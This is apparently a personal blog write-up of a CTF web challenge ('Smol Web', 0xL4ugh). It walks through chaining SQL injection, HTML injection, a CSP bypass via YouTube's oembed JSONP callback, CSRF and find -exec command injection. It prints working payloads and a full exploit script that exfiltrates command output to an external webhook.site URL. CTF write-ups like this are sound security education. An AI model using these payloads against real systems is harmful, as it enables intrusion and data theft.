---
title: 0xL4ughCTF
description: Crazy "Easy" challenge
date: '2026-1-25'
ranking: 427th
teams: 1693
tags:
  - sqli
  - csp-bypass
  - cmd-injection
published: true
---

<script lang="ts">
  import flag from '$lib/assets/images/0xL4ugh/flagged.png'
  import flag_webhook from '$lib/assets/images/0xL4ugh/flag.png'
  import script_injected from '$lib/assets/images/0xL4ugh/scriptt.png'
  import csp_bypass from '$lib/assets/images/0xL4ugh/csp_bypass.png'
  import alert from '$lib/assets/images/0xL4ugh/alert.png'
  import rankings from '$lib/assets/images/0xL4ugh/rankings.png'
</script>

Hello again! :)

<br>

Today was a **good** day. I played the 0xL4ugh CTF together with my boys from  
[Bits & Pieces](https://ctftime.org/team/178228/), but none of us were ready for
the **brutal difficulty** of the web challenges. 

(Over 1600+ teams, only 44 teams solved it, including mine)

<br>

After roughly two hours of recon, no one had made any meaningful progress on
any challenge- needless to say, our motivation was starting to deteriorate really hard but, as you will
see, that’s often the exact moment when you need to double down and push
forward. >:3

<br>

Because it is only through hardship that you ascend to the stars.  
*Per aspera ad astra*! or, well- in our case, *per aspera ad flag*! :3

<br>

With that said, I’m proud to present (part of) my writeup for the web challenge
that kept me awake for two nights straight.

## Smol Web - 44 Solves
This challenge consisted of a flask application with a `/readflagbinary` binary that, guess what, needs to be executed to retrieve the flag- so... we need to obtain RCE somehow<br>

## Initial Analysis

The application has several endpoints:
- `/ratings` - Displays products filtered by quantity parameter
- `/report` - Submit URLs for admin bot to visit
- `/search` - File search functionality (localhost only)
- `/finder` - File finder interface (localhost only)

### Key Observations
**1) SQL Injection(s)**<br>
The first blatant vulnerability that the eye can see is this **SQL Injection** in `/ratings`:
```python
quantity = request.args.get("quantity", "") or '9'
if any(c in quantity for c in ("'", '"', "\\")):
   quantity = 7
   flash("Warning: Suspicious characters detected...")
db = get_db()                                                                  #HERE!
sql = f"SELECT id, name, description, user_id FROM products WHERE quantity = {quantity}"
```

The `quantity` parameter had some basic filtering but still allows sqli since quotes aren't needed for UNION attacks.
<br>

On top of that, a friend of mine made me notice that the SQLi didn't stop there! In fact, one might see that the results of the first sqli are reused in this other query
```python
user_q = f"SELECT id, name FROM users WHERE id = {r['user_id']}"
user_row = db.execute(user_q).fetchone()
user_name = user_row['name'] if user_row else "(unknown user)"
```

The `user_name` is then directly rendered in HTML without sanitization! That's a straight up **HTML Injection** right there!

<br>


**2) Content Security Policy**<br>
Now, having established that there is potential for HTML injection, we must face this bastard of a **CSP**.

```python
csp = (
    "default-src 'self'; "
    "script-src 'self' https://cdn.tailwindcss.com https://www.youtube.com; "
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; "
    "font-src 'self' https://fonts.gstatic.com; "
    "img-src 'self' data:; "
    "child-src 'self' https://www.youtube.com; "
    "frame-src 'self' https://www.youtube.com; "
    "object-src 'none'; "
    "base-uri 'self'; "
    "form-action 'self';"
)
```

This absolute party pooper blocks almost every script- besides those that originate from `https://www.youtube.com` (since the page included a funny video of a stickman reminding me that I suffer from skill issue)<br>
You will see how we can exploit this in our favor :D
<br>


**3) Report System**
```python
@rating_app.route("/report", methods=["GET", "POST"])
def report_bug():
    message = None
    if request.method == "POST":
        url_to_visit = request.form.get("url", "")
        try:
            result = post("http://bot:3000/visit", json={"uri": url_to_visit}, timeout=12)
            message = result.text
        except subprocess.TimeoutExpired:
            message = "Admin Bot timed out before completing the visit. (12 sec limit)"
        except FileNotFoundError:
            message = "Error: Admin Bot script (admin_bot.js) not found. Check setup."
        except Exception as e:
            message = f"An unexpected error occurred during the bot execution: {e}"
    return render_template("report_page.html", message=message, admin_user_id="1" )
```
Apparently, we can make a bot visit internal links, which is great! <br>
Unfortunately there is no output so we will need to figure out a way to exfiltrate the data

<br>

**4) Command Injection**
```python
@rating_app.route('/search', methods=['POST'])
@localhost_only
def search():
    payload = str(request.form.get('search', ''))
    if not payload or len(payload) > 18:
        flash('Search term cannot be empty, or more than 18 chars!')
        return redirect(url_for('finder_index'))
    sanitized_payload = sanitize_input(payload)
    output = ""
    try:
        cmd = f"find {FILES_DIR} {sanitized_payload}"
        print(f"[DEBUG] Executing command: {cmd}")
        (...)
```

Wuzz that? Seems like the `/search` endpoint is suitable for obtaining **command injection**! But of course it's protected by `@localhost_only` decorator, we have to make a **POST** to the endpoint and the payload is **sanitized** quite heavily...

```python
def sanitize_input(payload):
    if payload is None:
        return ""
    s = str(payload)
    cmds = ['cc', 'gcc ', 'ex ', 'sleep ']

    if re.search(r"""[<>mhnpdvq$srl+%kowatf123456789'^@"\\]""", s):
        return "Character Not Allowed"
    if any(cmd in s for cmd in cmds):
        return "Command Not Allowed"
    pattern = re.compile(r'([;&|$\(\)\[\]<>])')
    escaped = pattern.sub(r'\\\\\\1', s)
    return escaped
```

## The Walkthrough

### Step 1: Injecting HTML

After reading all of that- at least- you did read it did you?

Our priority was getting that HTML Injection in `/ratings`
<br>

Since quotes are blocked the only way we can inject strings is by using the `CHAR()` function in SQL, I had to implement this extra function to chain more `CHAR()` together since it has a limit

```python
def to_char(s):
    chars = [str(ord(c)) for c in s]
    
    chunks = []
    for i in range(0, len(chars), 40):
        chunk = ",".join(chars[i:i+40])
        chunks.append(f"CHAR({chunk})")
    
    return "||".join(chunks)

meta_payload = f"0 UNION SELECT 1,'<script>alert(1)</script>'"
    char_payload = to_char(meta_payload)
    sqli_stage1 = f"0 UNION SELECT 1,2,3,{char_payload}"
```

This snippet basically encodes the payload for the second sqli in CHAR functions
```SQL
 0 UNION SELECT 1,'<script>alert(1)</script>'
 ```
 and we then inject this into the first sqli 
 ```SQL
 0 UNION SELECT 1,2,3,{char_payload}
 ```

 Unfortunately our script won't be executed as the CSP prevents it from running- shucks<br>
 At least we successfully injected HTML elements in the page :D

 <img src={script_injected} alt="csp">

### Step 2: CSP Bypass via YouTube JSONP

Now, take a deep breath imagine things from my point of view:

<br>

It's 2am, you have to type quietly and you hear the walls talking about your skill issue. But then, all of a sudden, you managed to obtain HTML injection.

<br>

There were two possible ways to proceed:

- Make a meta refresh and make a csrf via an external page (triggering CORS errors)
- Find a way to bypass the csp

Since I was burned out- I decided to try both

I tried hosting an html page at jsfiddle that would redirect the bot

```html
EXPLOIT.HTML
<iframe name="result" id="result" style="display:none;"></iframe>

<form id="csrf" method="POST" action="https://webhook.site/c1254a06-08fd-4212-a2c0-86eb7ab881c5" target="result">
    <input type="hidden" name="search" value="-exec /???????????????y">
</form> 
```

Turns out that the first meta refresh worked perfectly, the bot was redirected correctly to my webhook / jsfiddle page, but then it gave me no output, so I abandoned that road.
<br>

I was about to transform into a werewolf and smash all the setup when- *blink*!
[This article](https://infosecwriteups.com/riding-the-waves-of-api-versioning-unmasking-a-stored-xss-vulnerability-bypassing-csp-using-c039c10df2b1?gi=016ac0642cf5) came to my mind. It was PERFECT

```
https://www.youtube.com/oembed?callback=ARBITRARY_JS_HERE
```

Since the CSP allows `script-src https://www.youtube.com`, we can inject:

```html
<script src="https://www.youtube.com/oembed?callback=alert(1337)"></script>
```

This bypasses the CSP because:
1. The script source is from an allowed domain (youtube.com)
2. Our JavaScript code is passed as a URL parameter (not inline)
3. YouTube's JSONP endpoint executes our callback

And... Ta-dah ;D

<img src={alert} alt="alert">

### Step 3: CSRF to Command Injection

It was now almost 3 am and I was able to spawn an alert.

I thought that I had most of the job done but I was dead wrong

I kept getting error messages from `https://www.youtube.com/oembed` since I have skill issues with writing pure js queries
even LLMs couldn't write anything acceptable by the endpoint, so I had to constantly try to tweak and adjust whatever script the LLMs would generate

<br>

After half an hour of funk music and tweaking I managed to make a post and exfiltrate the output. I was IN

```javascript
var xhr=new XMLHttpRequest();
xhr.open('POST','/search',true);
xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
xhr.onload=function(){
    var d=new DOMParser().parseFromString(xhr.responseText,'text/html');
    var output=d.querySelector('pre').textContent;
    location='WEBHOOK?response='+btoa(output)
};
xhr.send('search=');
//vibecoding sucks
```

This:
1. Makes a POST request to `/search` (bot has localhost access)
2. Parses the response HTML to extract command output
3. Exfiltrates the response to our webhook via redirect

Since it was already around 4 am, I decided to get some sleep and set three
alarms for 10 am- enough to rest, but not too much. There was still one last,
crucial piece missing to complete the exploit.

### Step 4: Command Injection
Finally awake, I started analyzing this um- peculiar- filter

```python
def sanitize_input(payload):
    if payload is None:
        return ""
    s = str(payload)
    cmds = ['cc', 'gcc ', 'ex ', 'sleep ']

    if re.search(r"""[<>mhnpdvq$srl+%kowatf123456789'^@"\\]""", s):
        return "Character Not Allowed"
    if any(cmd in s for cmd in cmds):
        return "Command Not Allowed"
    pattern = re.compile(r'([;&|$\(\)\[\]<>])')
    escaped = pattern.sub(r'\\\\\\1', s)
    return escaped
```

Notice that the payload would be appended here

```python
cmd = f"find {FILES_DIR} {sanitized_payload}"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
```

My first intuition was to use -exec to run the `/readflagbinary`, and thankfully [gtfobins](https://gtfobins.org/gtfobins/find/) came in clutch with correct syntax for the command, which I kept getting wrong

<br>

I knew i was this 🤏 close to get the flag, but believe me I was hallucinating, it seemed like the binary had disappeared- every command that I injected either returned "No file found" or just didn't return anything 
<br>
But then, for- god knows whatever reason, I found it, a payload under 18 characters that could find and execute that damn binary

```javascript
xhr.send('search=-exec /*e*b*y ;');
```

<br>

It was now time to get revenge for priving me of good hours of sleep. 


### Step 5: FULL CHAIN

Let's recap the exploit chain:

1. **Inject HTML:**
```python
meta_payload = f"0 UNION SELECT 1,'{xss_payload}'"
char_payload = to_char(meta_payload)
sqli_stage1 = f"0 UNION SELECT 1,2,3,{char_payload}"
    
url = f"{TARGET_URL}/ratings?quantity={sqli_stage1}"
```

2. **Bypass the CSP:**
```python
callback_payload = "var xhr=new XMLHttpRequest();xhr.open('POST','/search',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.onload=function(){var d=new DOMParser().parseFromString(xhr.responseText,'text/html');var output=d.querySelector('pre').textContent;location='" + WEBHOOK + "?flag='+btoa(output)};xhr.send('search=-exec /*e*b*y ;');"
encoded_callback = urllib.parse.quote(callback_payload)
xss_payload = f'<script src="https://www.youtube.com/oembed?callback={encoded_callback}"></script>'
```

3. **Report to admin bot:**
Since the challenge instance lasted for 15 minutes, I manually copied and pasted the payload in the `/report` endpoint, which makes the admin bot visit the HTML injected page, make a post to /search injecting `-exec /*e*b*y ;` and will exfiltrate the output to our webhook.
<br>

## Full Exploit Code

```python
import urllib.parse

TARGET_URL = "http://challenges4.ctf.sd:34783"  
WEBHOOK = "https://webhook.site/249e1873-8d58-4d62-81a1-6dfbd801d6ff" 

def to_char(s):
    """Convert string to SQL CHAR() with concatenation to avoid arg limit"""
    chars = [str(ord(c)) for c in s]
    
    chunks = []
    for i in range(0, len(chars), 40):
        chunk = ",".join(chars[i:i+40])
        chunks.append(f"CHAR({chunk})")
    
    return "||".join(chunks)

def xss_csp():
    callback_payload = (
        "var xhr=new XMLHttpRequest();"
        "xhr.open('POST','/search',true);"
        "xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');"
        "xhr.onload=function(){"
            "var d=new DOMParser().parseFromString(xhr.responseText,'text/html');"
            "var output=d.querySelector('pre').textContent;"
            "location='" + WEBHOOK + "?flag='+btoa(output)"
        "};"
        "xhr.send('search=-exec /*e*b*y ;');"
    )
    
    encoded_callback = urllib.parse.quote(callback_payload)
    
    xss_payload = f'<script src="https://www.youtube.com/oembed?callback={encoded_callback}"></script>'

    meta_payload = f"0 UNION SELECT 1,'{xss_payload}'"
    char_payload = to_char(meta_payload)
    sqli_stage1 = f"0 UNION SELECT 1,2,3,{char_payload}"

def main():
    xss_csp()

if __name__ == "__main__":
    main()
```

## Flag

Finally, after about 8 total hours on this challenge, the stars aligned:

<img src={flag_webhook} alt="wbhook">
<img src={flag} alt="wbhook">

This brought my profile alone to a whopping 144th place over 1693 teams, which means that basically me and [Shy](https://ctftime.org/user/172276) (which flagged a misc challenge) are in the top 12% of the teams. Not bad!

<img src={rankings} alt="scoring">
<br>
Well, that's all! I hope you have a wonderful day!

Thank you for reading :) \<3